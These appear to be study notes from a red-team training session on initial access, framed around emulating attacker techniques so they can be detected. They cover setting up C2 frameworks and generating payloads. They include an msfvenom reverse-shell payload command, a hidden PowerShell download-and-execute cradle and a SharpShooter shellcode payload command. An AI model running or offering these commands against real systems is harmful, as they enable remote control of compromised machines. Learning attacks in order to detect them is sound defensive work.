## Attack Fundamentals Initial Access Pt1

- Alfie Champion @ajp500
- Riccardo Ancarni 

- Improve understanding of attacks. so we can detect and prevent them
- Jarral Atckinson Blogs on extraction

- Analyse set of known ttps used by real threat actors
- Emulate them in a controlled lab enviroment 
- Observe the traces they leave

##Inital Access

Inital access is the set of tatics, techniques procedures used by malicious actors to obtain a foothold in the target environment

- maldocs example https://dissectmalware.wordpress.com/tag/maldoc/

###Empire

Initial Setup

Run the ./setup/install.sh script. This will install the few dependencies and run the ./setup/setup_database.py script. The setup_database.py file contains various setting that you can manually modify, and then initializes the ./data/empire.db backend database. No additional configuration should be needed- hopefully everything works out of the box.

Running ./empire will start Empire, and ./empire –debug will generate a verbose debug log at ./empire.debug. The included ./setup/reset.sh will reset/reinitialize the database and launch Empire in debug mode. There’s also a detailed “Empire Tips and Tricks” post up here.

- empire powershell https://github.com/EmpireProject/Empire


###Covenant

```
$ ~ > git clone --recurse-submodules https://github.com/cobbr/Covenant
$ ~ > cd Covenant/Covenant
$ ~/Covenant/Covenant > dotnet run
warn: Microsoft.EntityFrameworkCore.Model.Validation[10400]
      Sensitive data logging is enabled. Log entries and exception messages may include sensitive application data, this mode should only be enabled during development.
WARNING: Running Covenant non-elevated. You may not have permission to start Listeners on low-numbered ports. Consider running Covenant elevated.
Covenant has started! Navigate to https://127.0.0.1:7443 in a browser
```

- covenant c2 framework https://bestestredteam.com/2020/02/19/interacting-with-covenant-c2/

- covenant create a listener
- covenant launcher , stageless payload 
- encode in base64, fuzz 

```
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet build
dotnet run
```
###Kodaic 

- kodaic hta used by apt28 https://github.com/zerosum0x0/koadic

```
git clone https://github.com/zerosum0x0/koadic.git
cd koadic
pip3 install -r requirements.txt
./koadic
```

- Is able to generate stagers within the hta  
- post aquistion framework

- set SRVHOST 192.168.7.2
- execute (generate the stager)
- zombies (implants)
- use exec_cmd 
- info 


###Cobalt Strike

```
Linux
Setup a recommended Java environment for Linux
Extract cobaltstrike-dist.tgz
tar zxvf cobaltstrike-dist.tgz
Run the update program to finish setup.
```

https://www.cobaltstrike.com/downloads/csmanual43.pdf

- cobalt strike beyond
- com shell execute method

- 


###Metasploit 

https://www.darkoperator.com/installing-metasploit-in-ubuntu

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.232.134 LPORT=4444 -f raw -b '\x00' -e x86/shikata_ga_nai -o shellcode.bin
```

- ct framework metasploit framework 

- operation cobalt kitty
- create listener 
- sigma rule, sigma converters. splunk, 
- babies of pain detect TTP
- eventid 4768, eventid 3, eventid 1
- os query tool
- LOLBin
- shellcode, doesn't need external depenaces,
- excel 4.0 code.


### Invoke-Obfuscation

- Powershell Module, ScriptBlock and Transcription logging to log Obfuscation

```
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.232.134:80/a'))"
```

https://github.com/danielbohannon/Invoke-Obfuscation

### sharpshooter 

SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. It leverages James Forshaw's DotNetToJavaScript tool to invoke methods from the SharpShooter DotNet serialised object. Payloads can be retrieved using Web or DNS delivery or both; SharpShooter is compatible with the MDSec ActiveBreach PowerDNS project. Alternatively, stageless payloads with embedded shellcode execution can also be generated for the same scripting formats.

https://github.com/mdsecactivebreach/SharpShooter

```
python Sharpshooter.py --payload slk --rawscfile /tnp/shellcode.bin  --output test
```
